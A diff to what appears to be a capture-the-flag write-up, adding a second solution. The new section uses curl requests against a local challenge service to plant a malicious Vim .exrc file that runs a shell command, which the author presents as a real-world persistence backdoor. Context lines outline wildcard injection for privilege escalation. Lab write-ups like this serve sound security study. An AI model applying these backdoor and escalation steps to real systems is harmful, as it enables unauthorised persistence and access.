@@ -77,7 +77,7 @@ int main(int argc, char *argv[]) {
 
 ```
 
-## Wildcard Injection
+## Solution 1: Wildcard Injection
 
 I like CTF challenges, which use real-world patterns. In this task we have the ability to use special characters and commands in Bash because of the option `shell=True`. We can't use pipes, but wildcard `*` and the new command via `;` are still available for us. We can remember bash script misconfigurations, which lead to privilege escalation. And the main idea is [Wildcard Injection](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/). We can create arbitrary files and call them as arguments via `*`. But we have only 4 characters; from where can we use this attack? We are not root, so my first assumption was `/tmp`. But this will not work, because we can't traverse to there. The second assumption was to use a double wildcard `/*/*` and this is better but not good enough. We need another writable path. Let's just search for it:
 ```bash
@@ -119,4 +119,17 @@ $ curl "http://127.0.0.1:7331/exec?cmd=~/z"
 SAS{example}
 ```
 
+## Solution 2: Vim backdoor
+
+Another way to solve it is to backdoor vim. We can change the configuration file for Vim and then execute it. This is realword way to achieve persistence on a system or read all writable data.
+```bash
+$ curl "http://127.0.0.1:7331/write?filename=/home/patapim/a" -d "/tung tung tung tung tung sahur"
+OK%
+$  curl "http://127.0.0.1:7331/write?filename=/home/patapim/.exrc" -X POST --data '!chmod 777 ~/a'
+OK%
+$  curl "http://127.0.0.1:7331/exec?cmd=vi"
+Command 'vi' returned non-zero exit status 1.%
+$  curl "http://127.0.0.1:7331/exec?cmd=~/a"
+SAS{example}
+```
 
